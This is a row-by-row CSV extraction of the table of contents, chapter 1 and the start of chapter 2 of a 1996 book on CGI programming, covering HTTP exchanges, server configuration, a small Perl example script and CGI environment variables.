Larger Text,Smaller Text,Symbol
CGI Programming on the World Wide Web ,"By Shishir Gundavaram; ISBN: 1-56592-168-2, 433 pages. 
  
 First Edition, March 1996.",NA
Table of Contents,NA,NA
Preface ,NA,NA
Chapter 1: ,NA,NA
The Common Gateway Interface (CGI) ,NA,NA
Chapter 2: ,NA,NA
Input to the Common Gateway Interface ,NA,NA
Chapter 3: ,NA,NA
Output from the Common Gateway Interface ,NA,NA
Chapter 4: ,NA,NA
Forms and CGI ,NA,NA
Chapter 5: ,NA,NA
Server Side Includes ,NA,NA
Chapter 6: ,NA,NA
Hypermedia Documents ,NA,NA
Chapter 7: ,NA,NA
Advanced Form Applications ,NA,NA
Chapter 8: ,NA,NA
Multiple Form Interaction ,NA,NA
Chapter 9: ,NA,NA
"Gateways, Databases, and Search/Index Utilities ",NA,NA
Chapter 10: ,NA,NA
Gateways to Internet Information Servers ,NA,NA
Chapter 11: ,NA,NA
Advanced and Creative CGI Applications ,NA,NA
Chapter 12: ,NA,NA
Debugging and Testing CGI Applications,NA,NA
Appendix A: ,NA,NA
Perl CGI Programming FAQ ,NA,NA
Appendix B: ,NA,NA
Summary of Regular Expressions ,NA,NA
Appendix C: ,NA,NA
CGI Modules for Perl 5 ,NA,NA
Appendix D: ,NA,NA
CGI Lite ,NA,NA
Appendix E: ,NA,NA
"Applications, Modules, Utilities, and Documentation",NA,NA
Index ,NA,NA
Examples,NA,NA
 - ,NA,NA
Warning:,NA,NA
 this directory includes long filenames which may confuse some older ,NA,NA
operating systems (notably Windows 3.1).,NA,NA
Search,NA,NA
 the text of ,NA,NA
CGI Programming on the World Wide Web,NA,NA
.,"Copyright
  Â© 1996, 1997 O'Reilly & Associates. All Rights Reserved.",NA
1. The Common Gateway Interface (CGI),NA,NA
Contents: ,NA,NA
What Is CGI?,NA,NA
CGI Applications,NA,NA
Some Working CGI Applications,NA,NA
Internal Workings of CGI,NA,NA
Configuring the Server,NA,NA
Programming in CGI,NA,NA
CGI Considerations,NA,NA
Overview of the Book,NA,NA
1.1 What Is CGI?,NA,NA
"As you traverse the vast frontier of the World Wide Web, you will come across documents that make ",NA,NA
"you wonder, ",NA,NA
"""How did they do this?""",NA,NA
" These documents could consist of, among other things, forms ",NA,NA
"that ask for feedback or registration information, imagemaps that allow you to click on various parts ",NA,NA
"of the image, counters that display the number of users that accessed the document, and utilities that ",NA,NA
"allow you to search databases for particular information. In most cases, you'll find that these effects ",NA,NA
"were achieved using the Common Gateway Interface, commonly known as CGI.",NA,NA
"One of the Internet's worst-kept secrets is that CGI is astoundingly simple. That is, it's trivial in ",NA,NA
"design, and anyone with an iota of programming experience can write rudimentary scripts that work. ",NA,NA
It's only when your needs are more demanding that you have to master the more complex workings of ,NA,NA
"the Web. In a way, CGI is easy the same way cooking is easy: anyone can toast a muffin or poach an ",NA,NA
egg. It's only when you want a Hollandaise sauce that things start to get complicated.,NA,NA
CGI is the part of the Web server that can communicate with other programs running on the server. ,NA,NA
"With CGI, the Web server can call up a program, while passing user-specific data to the program ",NA,NA
"(such as what host the user is connecting from, or input the user has supplied using HTML form ",NA,NA
syntax). The program then processes that data and the server passes the program's response back to ,NA,NA
the Web browser.,NA,NA
CGI isn't magic; it's just programming with some special types of input and a few strict rules on ,NA,NA
"program output. Everything in between is just programming. Of course, there are special techniques ",NA,NA
"that are particular to CGI, and that's what this book is mostly about. But underlying it all is the simple ",NA,NA
model shown in ,NA,NA
Figure 1.1,NA,NA
.,NA,NA
Figure 1.1: Simple diagram of CGI,NA,NA
Acknowledgments,NA,NA
CGI Applications,NA,NA
1.2 CGI Applications,NA,NA
CGI turns the Web from a simple collection of static hypermedia documents into a whole new interactive ,NA,NA
"medium, in which users can ask questions and run applications. Let's take a look at some of the possible ",NA,NA
applications that can be designed using CGI.,NA,NA
Forms,NA,NA
One of the most prominent uses of CGI is in processing forms. Forms are a subset of HTML that allow the user ,NA,NA
to supply information. The forms interface makes Web browsing an interactive process for the user and the ,NA,NA
provider. ,NA,NA
Figure 1.2,NA,NA
 shows a simple form.,NA,NA
Figure 1.2: Simple form illustrating different widgets,"[Graphic: 
  
 Figure 1-2]",NA
"As can be seen from the figure, a number of graphical widgets are available for form creation, such as radio ",NA,NA
"buttons, text fields, checkboxes, and selection lists. When the form is completed by the user, the Submit Order! ",NA,NA
"button is used to send the information to the server, which executes the program associated with the particular ",NA,NA
"form to ""decode"" the data.",NA,NA
"Generally, forms are used for two main purposes. At their simplest, forms can be used to collect information from ",NA,NA
"the user. But they can also be used in a more complex manner to provide back-and-forth interaction. For example, ",NA,NA
"the user can be presented with a form listing the various documents available on the server, as well as an option to ",NA,NA
search for particular information within these documents. A CGI program can process this information and return ,NA,NA
document(s) that match the user's selection criteria.,NA,NA
"Chapter 4, ",NA,NA
Forms and CGI,NA,NA
", discusses forms in detail, and ",NA,NA
"Chapter 7, ",NA,NA
Advanced Form Applications,NA,NA
", shows",NA,NA
examples of incorporating forms into several robust applications.,NA,NA
Gateways,NA,NA
Web gateways are programs or scripts used to access information that is not directly readable by the client. For ,NA,NA
"example, say you have an Oracle database that contains baseball statistics for all the players on your company ",NA,NA
team and you would like to provide this information on the Web. How would you do it? You certainly cannot ,NA,NA
"point your client to the database file (i.e., open the URL associated with the file) and expect to see any ",NA,NA
meaningful data.,NA,NA
CGI provides a solution to the problem in the form of a gateway. You can use a language such as ,NA,NA
oraperl,NA,NA
 (see ,NA,NA
"Chapter 9, ",NA,NA
"Gateways, Databases, and Search/Index Utilities",NA,NA
", for more information) or a DBI extension to Perl to",NA,NA
"form SQL queries to read the information contained within the database. Once you have the information, you can ",NA,NA
"format and send it to the client. In this case, the CGI program serves as a gateway to the Oracle database, as ",NA,NA
shown in ,NA,NA
Figure 1.3,NA,NA
.,NA,NA
Figure 1.3: A gateway to a database,"[Graphic: 
  
 Figure 1-3]",NA
"Similarly, you can write gateway programs to any other Internet information service, including Archie, WAIS, ",NA,NA
and NNTP (Usenet News). ,NA,NA
"Chapter 10, ",NA,NA
Gateways to Internet Information Servers,NA,NA
", shows examples of interacting",NA,NA
"with other Internet services. In addition, you can amplify the power of gateways by using the forms interface to ",NA,NA
request a query or search string from the user to retrieve and display ,NA,NA
dynamic,NA,NA
", or ",NA,NA
"virtual,",NA,NA
 information. We will ,NA,NA
discuss these special documents next.,NA,NA
Virtual Documents,NA,NA
"Virtual, or dynamic, document creation is at the heart of CGI. Virtual documents are created on the fly in ",NA,NA
"response to a user's information request. You can create virtual HTML, plain text, image, and even audio ",NA,NA
documents. A simple example of a virtual document could be something as trivial as this:,NA,NA
Welcome to Shishir's WWW Server!,NA,NA
You are visiting from diamond.com. The load average on this machine is 1.25.,NA,NA
Happy navigating!,NA,NA
"In this example, there are two pieces of dynamic information: the alphanumeric address (IP name) of the remote ",NA,NA
"user and the load average on the serving machine. This is a very simple example, indeed!",NA,NA
"On the other hand, very complex virtual documents can be created by writing programs that use a combination of ",NA,NA
"graphics libraries, gateways, and forms. As a more sophisticated example, say you are the manager of an art ",NA,NA
gallery that specializes in selling replicas of ancient Renaissance paintings and you are interested in presenting ,NA,NA
images of these masterpieces on the Web. You start out by creating a form that asks for user information for the ,NA,NA
"purpose of promotional mailings, presents a search field for the user to enter the name of a painting, as well as a ",NA,NA
"selection list containing popular paintings. Once the user submits the form to the server, a program can email the ",NA,NA
"user information to a certain address, or store it in a file. And depending on the user's selection, either a message ",NA,NA
stating that the painting does not exist or an image of the painting can be displayed along with some historical ,NA,NA
information located elsewhere on the Internet.,NA,NA
"Along with the picture and history, another form with several image processing options to modify the brightness, ",NA,NA
"contrast, and/or size of the picture can be displayed. You can write another CGI program to modify the image ",NA,NA
"properties on the fly using certain graphics libraries, such as ",NA,NA
gd,NA,NA
", sending the resultant picture to the client.",NA,NA
This is an example of a more complex CGI program using many aspects of CGI programming. Several such ,NA,NA
examples will be presented in this book.,NA,NA
What Is CGI?,NA,NA
Some Working CGI,NA,NA
Applications,NA,NA
1.3 Some Working CGI Applications,NA,NA
What better way to learn about CGI than to see actual programs in action? Here are the locations of ,NA,NA
some of the more impressive CGI programs on the Web:,G,NA
Lycos World Wide Web Search,NA,NA
Located at ,NA,NA
http://www.lycos.com,NA,NA
", this server allows the user to search the Web for specific",NA,NA
documents. Lycos returns a dynamic hypertext document containing the documents that match ,NA,NA
the user's search criteria.,G,NA
Coloring Book,NA,NA
An entertaining application that displays an image for users to color. It can be accessed at ,NA,NA
http://www.ravenna.com/coloring,NA,NA
.,G,NA
ArchiePlex Gateway,NA,NA
A gateway to the Archie search server. Allows the user to search for a specific string and ,NA,NA
returns a virtual hypertext document. This useful gateway is located at ,NA,NA
http://pubweb.nexor.co.uk/public/archie/archieplex/archieplex.html,NA,NA
. A simple Archie gateway,NA,NA
is presented in ,NA,NA
"Chapter 10, ",NA,NA
Gateways to Internet Information Servers,NA,NA
.,G,NA
Guestbook with World Map,NA,NA
A guestbook is a forms-based application that allows users to leave messages for everyone to ,NA,NA
"see. Though there are numerous guestbooks on the Web, this is one of the best. You can access ",NA,NA
it at ,NA,NA
http://www.cosy.sbg.ac.at/rec/guestbook,NA,NA
.,G,NA
Japanese <-> English Dictionary,NA,NA
"A sophisticated CGI program that queries the user for an English word, and returns a virtual ",NA,NA
"document with graphic images of an equivalent Japanese word, or vice versa. It can be accessed ",NA,NA
at ,NA,NA
http://www.wg.omron.co.jp/cgi-bin/je?SASE=jfiedl.html,NA,NA
 or at,NA,NA
http://enterprise.ic.gc.ca/cgi-bin/j-e,NA,NA
.,NA,NA
"Although most of these documents are curiosities, they illustrate the powerful aspects of CGI. The ",NA,NA
interface allows for the creation of highly effective virtual documents using forms and gateways.,NA,NA
CGI Applications,NA,NA
Internal Workings of CGI,NA,NA
1.4 Internal Workings of CGI,NA,NA
So how does the whole interface work? Most servers expect CGI programs and scripts to reside in a ,NA,NA
"special directory, usually called ",NA,NA
cgi-bin,NA,NA
", and/or to have a certain file extension. (These configuration ",NA,NA
parameters are discussed in the ,NA,NA
Configuring the Server,NA,NA
 section in this chapter.) When a user opens a,NA,NA
"URL associated with a CGI program, the client sends a request to the server asking for the file.",NA,NA
"For the most part, the request for a CGI program looks the same as it does for all Web documents. The ",NA,NA
"difference is that when a server recognizes that the address being requested is a CGI program, the ",NA,NA
"server does not return the file contents verbatim. Instead, the server tries to execute the program. Here ",NA,NA
is what a sample ,NA,NA
client,NA,NA
 request might look like:,NA,NA
GET /cgi-bin/welcome.pl HTTP/1.0,NA,NA
Accept: www/source,NA,NA
Accept: text/html,NA,NA
Accept: image/gif,NA,NA
User-Agent: Lynx/2.4 libwww/2.14,NA,NA
From: shishir@bu.edu,NA,NA
This GET request identifies the file to retrieve as ,NA,NA
/cgi-bin/welcome.pl,NA,NA
. Since the server is configured ,NA,NA
to recognize all files inf the ,NA,NA
cgi-bin,NA,NA
" directory tree as CGI programs, it understands that it should ",NA,NA
execute the program instead of relaying it directly to the browser. The string ,NA,NA
HTTP/1.0,NA,NA
 identifies the ,NA,NA
communication protocol to use.,NA,NA
The client request also passes the data formats it can accept (,NA,NA
www/source,NA,NA
", ",NA,NA
text/html,NA,NA
", and ",NA,NA
image/gif,NA,NA
"), ",NA,NA
"identifies itself as a Lynx client, and sends user information. All this information is made available to ",NA,NA
"the CGI program, along with additional information from the server.",NA,NA
The way that CGI programs get their input depends on the server and on the native operating system.,NA,NA
"On a UNIX system, CGI programs get their input from standard input (STDIN) and from UNIX ",NA,NA
environment variables. These variables store such information as the input search string (in the case of ,NA,NA
"a form), the format of the input, the length of the input (in bytes), the remote host and user passing the ",NA,NA
"input, and other client information. They also store the server name, the communication protocol, and ",NA,NA
the name of the software running the server.,NA,NA
"Once the CGI program starts running, it can either create and output a new document, or provide the ",NA,NA
"URL to an existing one. On UNIX, programs send their output to standard output (STDOUT) as a data ",NA,NA
stream. The data stream consists of two parts. The first part is either a full or partial HTTP header,NA,NA
"that (at minimum) describes what format the returned data is in (e.g., HTML, plain text, GIF, etc.). A ",NA,NA
"blank line signifies the end of the header section. The second part is the body, which contains the data ",NA,NA
conforming to the format type reflected in the header. The body is not modified or interpreted by the ,NA,NA
server in any way.,NA,NA
A CGI program can choose to send the newly created data directly to the client or to send it indirectly ,NA,NA
"through the server. If the output consists of a complete HTTP header, the data is sent directly to the ",NA,NA
"client without server modification. (It's actually a little more complicated than this, as we will discuss ",NA,NA
in ,NA,NA
"Chapter 3, ",NA,NA
Output from the Common Gateway Interface,NA,NA
".) Or, as is usually the case, the output is",NA,NA
sent to the server as a data stream. The server is then responsible for adding the complete header ,NA,NA
information and using the HTTP protocol to transfer the data to the client.,NA,NA
"Here is the sample output of a program generating an HTML virtual document, with the complete ",NA,NA
HTTP header:,NA,NA
HTTP/1.0 200 OK,NA,NA
"Date: Thursday, 22-February-96 08:28:00 GMT",NA,NA
Server: NCSA/1.4.2,NA,NA
MIME-version: 1.0,NA,NA
Content-type: text/html,NA,NA
Content-length: 2000,NA,NA
<HTML>,NA,NA
<HEAD><TITLE>Welcome to Shishir's WWW Server!</TITLE></HEAD>,NA,NA
<BODY>,NA,NA
<H1>Welcome!</H1>,NA,NA
.,NA,NA
.,NA,NA
</BODY>,NA,NA
</HTML>,NA,NA
"The header contains the communication protocol, the date and time of the response, the server name ",NA,NA
"and version, and the revision of the MIME protocol.[1] Most importantly, it also consists of the ",NA,NA
MIME content type and the number of characters (equivalent to the number of bytes) of the enclosed ,NA,NA
"data, as well as the data itself. Now, the output with the partial HTTP header:",NA,NA
[1] What is MIME and what does it stand for? MIME (Multipurpose Internet Mail ,NA,NA
Extensions) is a specification that was originally developed for sending multiple types of ,NA,NA
data through electronic mail. MIME types are used to identify types of data sent as ,NA,NA
content over the Web.,NA,NA
Content-type: text/html,NA,NA
<HTML>,NA,NA
<HEAD><TITLE>Welcome to Shishir's WWW Server!</TITLE></HEAD>,NA,NA
<BODY>,NA,NA
<H1>Welcome!</H1>,NA,NA
.,NA,NA
.,NA,NA
</BODY>,NA,NA
</HTML>,NA,NA
"In this instance, the only header line that is output is the ",NA,NA
Content-type,NA,NA
" header, which describes the ",NA,NA
"MIME format of the output. Since the output is in HTML format, ",NA,NA
text/html,NA,NA
 is the content type that is ,NA,NA
declared.,NA,NA
Most CGI programmers prefer to supply only a partial header. It is much simpler to output the format ,NA,NA
"and the data than to formulate the complete header information, which can be left to the server. ",NA,NA
"However, there are times when you need to send the information directly to the client (by outputting a ",NA,NA
"complete HTTP header), as you will see in ",NA,NA
"Chapter 3, ",NA,NA
Output from the Common Gateway Interface,NA,NA
.,NA,NA
Some Working CGI,NA,NA
Applications,NA,NA
Configuring the Server,NA,NA
1.5 Configuring the Server,NA,NA
"Before you can run CGI programs on your server, certain parameters in the server configuration files must ",NA,NA
"be modified. If you are using either the NCSA or CERN HTTP server, you need to first set the ",NA,NA
ServerRoot ,NA,NA
directive in the ,NA,NA
httpd.conf,NA,NA
 file to point to the directory where the server software is located:,NA,NA
ServerRoot          /usr/local/etc/httpd ,NA,NA
Running CGI Scripts,NA,NA
"On the NCSA server, the ",NA,NA
ScriptAlias,NA,NA
 directive in the server resource map file (,NA,NA
srm.conf,NA,NA
) indicates the ,NA,NA
directory where the CGI scripts are placed.,NA,NA
ScriptAlias          /cgi-bin/        /usr/local/etc/httpd/cgi-bin/,NA,NA
"For example, if a user accesses the URL:",NA,NA
http://your_host.com/cgi-bin/welcome,NA,NA
the local program:,NA,NA
/usr/local/etc/httpd/cgi-bin/welcome,NA,NA
will be executed by the server. You can have multiple directories to hold CGI scripts:,NA,NA
ScriptAlias          /cgi-bin/        /usr/local/etc/httpd/cgi-bin/,NA,NA
ScriptAlias          /my-cgi-bin/     /usr/local/etc/httpd/my-cgi-bin/,NA,NA
You might wonder why all CGI programs must be placed in distinct directories. The most important reason ,NA,NA
"for this is system security. By having all the programs in one place, a server administrator can control and ",NA,NA
"monitor all the programs being run on the system. However, there are directives that allow programs to be ",NA,NA
"run outside of these directories, based on the file extension. The following directives, when placed in the ",NA,NA
srm.conf,NA,NA
" configuration file, allow the server to execute files containing ",NA,NA
.pl,NA,NA
", ",NA,NA
.sh,NA,NA
", or ",NA,NA
.cgi,NA,NA
 extensions.,NA,NA
 AddType       application/x-httpd-cgi          .pl   .sh   .cgi       ,NA,NA
"However, this could be very dangerous! By globally enabling all files ending in certain extensions, there is ",NA,NA
"a risk that novice programmers might write programs that violate system security (e.g., printing the ",NA,NA
contents of important system files to standard output).,NA,NA
"On the CERN server, setting up the CGI directory is done in the ",NA,NA
httpd.conf file,NA,NA
", using the following syntax: ",NA,NA
Exec            /cgi-bin/*                /usr/local/etc/httpd/cgi-bin,NA,NA
Internal Workings of CGI,NA,NA
Programming in CGI,NA,NA
1.6 Programming in CGI,NA,NA
"You might wonder, ",NA,NA
"""Now that I know how CGI works, what programming language can I use?""",NA,NA
 The ,NA,NA
"answer to that question is very simple: You can use whatever language you want, although certain ",NA,NA
"languages are more suited for CGI programming than others. Before choosing a language, you must ",NA,NA
consider the following features:,G,NA
Ease of text manipulation,G,NA
Ability to interface with other software libraries and utilities,G,NA
Ability to access environment variables (in UNIX),NA,NA
Let's look at each of these features in more detail. Most CGI applications involve manipulating text (as you ,NA,NA
"will see throughout this book) some way or another, so inherent pattern matching is very important. For ",NA,NA
"example, form information is usually ""decoded"" by splitting the string on certain delimiters.",NA,NA
"The ability of a language to interface with other software, such as databases, is also very important. This ",NA,NA
"greatly enhances the power of the Web by allowing you to write gateways to other information sources, ",NA,NA
such as database engines or graphic manipulation libraries.,NA,NA
"Finally, the last attribute that must be taken into account is the ease with which the language can access ",NA,NA
"environmental variables. These variables constitute the input to the CGI program, and thus are very ",NA,NA
important.,NA,NA
"Some of the more popular languages for CGI programming include AppleScript, C/C++, C Shell, Perl, Tcl, ",NA,NA
"and Visual Basic. Here is a quick review of the advantages and, in some cases, disadvantages of each one.",NA,NA
AppleScript (Macintosh Only),NA,NA
"Since the advent of System 7.5, AppleScript is an integral part of the Macintosh operating system (OS).",NA,NA
"Though AppleScript lacks inherent pattern-matching operators, certain extensions have been written to ",NA,NA
make it easy to handle various types of data. AppleScript also has the power to interface with other ,NA,NA
"Macintosh applications through AppleEvents. For example, a Mac CGI programmer can write a program ",NA,NA
"that presents a form to the user, decode the contents of the form, and query and search a Microsoft FoxPro ",NA,NA
database directly through AppleScript.,NA,NA
"C/C++ (UNIX, Windows, Macintosh)",NA,NA
"C and C++ are very popular with programmers, and some use them to do CGI programming. These ",NA,NA
languages are not recommended for the novice programmer; C and C++ impose strict rules for variable and ,NA,NA
"memory declarations, and type checking. In addition, these languages lack database extensions and inherent ",NA,NA
"pattern-matching abilities, although modules and functions can be written to achieve these functions.",NA,NA
"However, C and C++ have a major advantage in that you can compile your CGI application to create a ",NA,NA
"binary executable, which takes up fewer system resources than using interpreters (like Perl or Tcl) to run ",NA,NA
CGI scripts.,NA,NA
C Shell (UNIX Only),NA,NA
"C Shell lacks pattern-matching operators, and so other UNIX utilities, such as ",NA,NA
sed,NA,NA
 or ,NA,NA
awk,NA,NA
", must be used ",NA,NA
"whenever you want to manipulate string information. However, there is a software tool, called ",NA,NA
uncgi,NA,NA
 and ,NA,NA
"written in C, that decodes form data and stores the information into shell environment variables, which can ",NA,NA
"be accessed rather easily. Obviously, communicating with a database directly is impossible, unless it is done ",NA,NA
through a foreign application,NA,NA
. ,NA,NA
"Finally, the C Shell has some serious bugs and limitations that make using it a ",NA,NA
dangerous proposition for the beginner.,NA,NA
"Perl (UNIX, Windows, Macintosh)",NA,NA
"Perl is by far the most widely used language for CGI programming! It contains many powerful features, ",NA,NA
and is very easy for the novice programmer to learn. The advantages of Perl include:,G,NA
It is highly portable and readily available.,G,NA
"It contains extremely powerful string manipulation operators, as well as functions to deal with binary ",NA,NA
data.,G,NA
It contains very simple and concise constructs.,"G 
  
 G",NA
"It makes calling shell commands very easy, and provides some useful equivalents of certain UNIX ",NA,NA
system functions.,NA,NA
"There are numerous extensions built on top of Perl for specialized functions; for example, there is ",NA,NA
oraperl,NA,NA
"(or the DBI Extensions), which contains functions for interfacing with the Oracle database.",NA,NA
"Because of these overwhelming advantages, Perl is the language used for most of the examples throughout ",NA,NA
this book.,NA,NA
"To whet your appetite slightly, here is an example of a CGI Perl program that creates the simple virtual ",NA,NA
document presented in the ,NA,NA
Virtual Documents,NA,NA
 section that appeared earlier in this chapter:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Content-type: text/plain"",""\n\n""; ",NA,NA
"print ""Welcome to Shishir's WWW Server!"", ""\n""; ",NA,NA
$remote_host = $ENV{'REMOTE_HOST'}; ,NA,NA
"print ""You are visiting from "", $remote_host, "". ""; ",NA,NA
$uptime = `/usr/ucb/uptime` ; ,NA,NA
"($load_average) = ($uptime =~ /average: ([^,]*)/); ",NA,NA
"print ""The load average on this machine is: "", $load_average, ""."", ""\n""; ",NA,NA
"print ""Happy navigating!"", ""\n""; ",NA,NA
exit (0);,NA,NA
The first line of the program is very important. It tells the server to run the Perl interpreter located in ,NA,NA
/usr/local/bin,NA,NA
 to execute the program.,NA,NA
Simple ,NA,NA
print,NA,NA
 statements are used to display information to the standard output. This CGI program outputs a ,NA,NA
partial HTTP header (the one ,NA,NA
Content-type,NA,NA
" header). Since this script generates plain text and not HTML, the ",NA,NA
content type is ,NA,NA
text/plain,NA,NA
.,NA,NA
Two newlines (,NA,NA
\n,NA,NA
) are output after the header. This is because HTTP requires a blank line between the,NA,NA
"header and body. Depending on the platform, you may need to output two carriage-return and newline ",NA,NA
combinations (,NA,NA
\r\n\r\n,NA,NA
).,NA,NA
The first print statement after the header is a greeting. The second print statement after the header displays ,NA,NA
the remote host of the user accessing the server. This information is retrieved from the environmental ,NA,NA
variable REMOTE_HOST.,NA,NA
"As you peruse the next bit of code, you will see what looks like a mess! However, it is a combination of ",NA,NA
"very powerful search operators, and is called a ",NA,NA
regular expression,NA,NA
 (or commonly known as ,NA,NA
regexp,NA,NA
)--see the ,NA,NA
"expression below. In this case, the expression is used to search the output from the UNIX command ",NA,NA
uptime ,NA,NA
"for a numeric value that is located between the string ""average:"" and the next comma.",[Graphic: Figure from the text],NA
"Finally, the last statement displays a good luck message.",NA,NA
Tcl (UNIX Only),NA,NA
"Tcl is gaining popularity as a CGI programming language. Tcl consists of a shell, ",NA,NA
tclsh,NA,NA
", which can be used ",NA,NA
"to execute your scripts. Like Perl, ",NA,NA
tclsh,NA,NA
" also contains simple constructs, but is a bit more difficult to learn ",NA,NA
"and use for the novice programmer. Like Perl, Tcl contains extensions to databases and graphic libraries. It ",NA,NA
"also supports regular expressions, but is quite inefficient in handling these expressions at compile time, ",NA,NA
especially when compared to Perl.,NA,NA
Visual Basic (Windows Only),NA,NA
Visual Basic is to Windows what AppleScript is to the Macintosh OS as far as CGI programming is ,NA,NA
"concerned. With Visual Basic, you can communicate with other Windows applications such as databases ",NA,NA
"and spreadsheets. This makes Visual Basic a very powerful tool for developing CGI applications on a PC, ",NA,NA
"and it is very easy to learn. However, Visual Basic lacks powerful string manipulation operators.",NA,NA
Configuring the Server,NA,NA
CGI Considerations,NA,NA
1.7 CGI Considerations,NA,NA
"Now that we have decided on a language for CGI programming, let's look at some considerations that ",NA,NA
need to be taken to create effective virtual documents.,NA,NA
"First and most importantly, you need to understand what kind of information is to be presented. If it is ",NA,NA
"plain text or HTML, there is no problem. However, if the data is unreadable by the client, a gateway ",NA,NA
has to be written to effectively translate that data.,NA,NA
"This leads to another important matter: The original (or ""unreadable"") data has to be organized in such ",NA,NA
a way that it will be easy for the gateway to read from and write to the data source. Once you have the ,NA,NA
"gateway and you can retrieve data, you can present it in numerous ways. For example, if the data is ",NA,NA
"numerical in nature, you can create virtual graphs and plots using various utility software. On the ",NA,NA
"other hand, if the data consists of graphical objects, you can modify the information using numerous ",NA,NA
graphic manipulation tools.,NA,NA
"In summary, you need to think about what you want to present and how to prevent it long before the ",NA,NA
actual process of implementing CGI programs. This will ensure the creation of effective virtual ,NA,NA
documents.,NA,NA
Programming in CGI,NA,NA
Overview of the Book,NA,NA
1.8 Overview of the Book,NA,NA
The main theme throughout this book is the design and creation of virtual hypermedia documents. A ,NA,NA
few things to note are:,"G 
  
 G 
  
 G",NA
"All of the examples in the book are in Perl (mostly v4.0, but they should run without ",NA,NA
"problems on v5.0), although some of the common modules are presented in the numerous ",NA,NA
languages mentioned above.,NA,NA
"When applicable, configuration details are slanted toward the NCSA server, as it is the most ",NA,NA
commonly used Web server on the Internet.,NA,NA
The phrases ,NA,NA
"""CGI programs""",NA,NA
 and ,NA,NA
"""CGI scripts""",NA,NA
 will be used interchangeably throughout the ,NA,NA
book.,NA,NA
"Chapters 2 through 5 cover the client-server interaction, including a look at the environmental ",NA,NA
"variables, working with forms, and server-side includes (SSI).",NA,NA
"From there, we discuss CGI programs that return virtual documents using various MIME content ",NA,NA
types in ,NA,NA
"Chapter 6, ",NA,NA
Hypermedia Documents,NA,NA
. Dynamic graphic image creation is the highlight of this,NA,NA
chapter.,NA,NA
Chapters 7 through 10 cover forms and gateways with a vast number of advanced examples. The ,NA,NA
"creation of static and dynamic forms, as well as communication with various databases and Internet ",NA,NA
"information servers, is presented in great detail.",NA,NA
"Chapter 11, ",NA,NA
Advanced and Creative CGI Applications,NA,NA
 walks through the design and implementation,NA,NA
of a number of advanced CGI applications.,NA,NA
"Finally, ",NA,NA
"Chapter 12, ",NA,NA
Debugging and Testing CGI Applications,NA,NA
 covers techniques for debugging your,NA,NA
"CGI programs, and lists some common mistakes and methods for finding your programming errors.",NA,NA
"The book also includes appendices with a Frequently Asked Questions list for Perl and CGI, a quick ",NA,NA
reference for regular expressions (since many examples depend heavily on the use of regular ,NA,NA
"expressions in Perl), an overview of CGI::* modules for Perl 5, an overview of the CGI Lite library, ",NA,NA
and a list of resources and URLs for more information and CGI-related software.,NA,NA
CGI Considerations,NA,NA
Input to the Common,NA,NA
Gateway Interface,NA,NA
2. Input to the Common Gateway ,NA,NA
Interface,NA,NA
Contents: ,NA,NA
Introduction ,NA,NA
Using Environment Variables,NA,NA
Accessing Form Input,NA,NA
Extra Path Information,NA,NA
Other Languages Under UNIX,NA,NA
Other Languages Under Microsoft Windows,NA,NA
Other Languages on Macintosh Servers,NA,NA
Examining Environment Variables,NA,NA
2.1 Introduction,NA,NA
"When a CGI program is called, the information that is made available to it can be roughly broken into ",NA,NA
three groups:,G,NA
"Information about the client, server, and user",G,NA
Form data that the user supplied,G,NA
Additional pathname information,NA,NA
"Most information about the client, server, or user is placed in CGI environment variables. Form data ",NA,NA
"is either incorporated into an environment variable, or is included in the ""body"" of the request. And ",NA,NA
extra path information is placed in environment variables.,NA,NA
"See a trend here? Obviously, CGI environment variables are crucial to accessing input to a CGI ",NA,NA
"program. In this chapter, we will first look at a number of simple CGI programs under UNIX that ",NA,NA
display and manipulate input. We will show some examples that use environment variables to perform ,NA,NA
"some useful functions, followed by examples that show how to process HTML form input. Then we ",NA,NA
will focus our attention on processing this information on different platforms.,NA,NA
Overview of the Book,NA,NA
Using Environment Variables,NA,NA
2.2 Using Environment Variables,"Much of the most crucial information needed by CGI applications is made available via UNIX environment variables. 
 Programs can access this information as they would any environment variable (e.g., via the 
 %ENV
  associative array in Perl).
  
 This section concentrates on showing examples of some of the more typical uses of environment variables in CGI programs. 
 First, however, 
 Table 2.1
  shows a full list of environment variables available for CGI.
  
  
 Table 2.1: List of CGI Environment Variables 
  
 Environment Variable 
  
 Description 
  
 GATEWAY_INTERFACE The revision of the Common Gateway Interface that the server uses.
  
 SERVER_NAME 
  
 The server's hostname or IP address.
  
 SERVER_SOFTWARE 
  
 The name and version of the server software that is answering the client request.
  
 SERVER_PROTOCOL 
  
 The name and revision of the information protocol the request came in with. 
 SERVER_PORT 
  
 The port number of the host on which the server is running.
  
 REQUEST_METHOD 
  
 The method with which the information request was issued.
  
 PATH_INFO 
  
 Extra path information passed to a CGI program.
  
 PATH_TRANSLATED 
  
 The translated version of the path given by the variable PATH_INFO.
  
 SCRIPT_NAME 
  
 The virtual path (e.g., 
 /cgi-bin/program.pl
 ) of the script being executed.
  
 DOCUMENT_ROOT 
  
 The directory from which Web documents are served.
  
 QUERY_STRING 
  
 The query information passed to the program. It is appended to the URL with a ""?"". 
 REMOTE_HOST 
  
 The remote hostname of the user making the request.
  
 REMOTE_ADDR 
  
 The remote IP address of the user making the request.
  
 AUTH_TYPE 
  
 The authentication method used to validate a user.
  
 REMOTE_USER 
  
 The authenticated name of the user.
  
 REMOTE_IDENT 
  
 The user making the request. This variable will only be set if NCSA 
 IdentityCheck
  flag is 
  
 enabled, and the client machine supports the RFC 931 identification scheme (ident daemon). 
 CONTENT_TYPE 
  
 The MIME type of the query data, such as ""text/html"".
  
 CONTENT_LENGTH 
  
 The length of the data (in bytes or the number of characters) passed to the CGI program through 
  
 standard input.
  
 HTTP_FROM 
  
 The email address of the user making the request. Most browsers do not support this variable. 
 HTTP_ACCEPT 
  
 A list of the MIME types that the client can accept.
  
  
 The browser the client is using to issue the request. HTTP_USER_AGENT 
  
 HTTP_REFERER 
  
 The URL of the document that the client points to before accessing the CGI program.
  
 We'll use examples to demonstrate how these variables are typically used within a CGI program.",NA
About This Server,NA,NA
Check the Client Browser,"Now, let's look at a slightly more complicated example. One of the more useful items that the server passes to the CGI 
 program is the client (or browser) name. We can put this information to good use by checking the browser type, and then 
 displaying either a text or graphic document.
  
 Different Web browsers support different HTML tags and different types of information. If your CGI program generates an 
 inline image, you need to be sensitive that some browsers support <IMG> extensions that others don't, some browsers support 
 JPEG images as well as GIF images, and some browsers (notably, Lynx and the old 
 www
  client) don't support images at all.
  
 Using the HTTP_USER_AGENT environment variable, you can determine which browser is being used, and with that 
 information you can fine-tune your CGI program to generate output that is optimized for that browser.
  
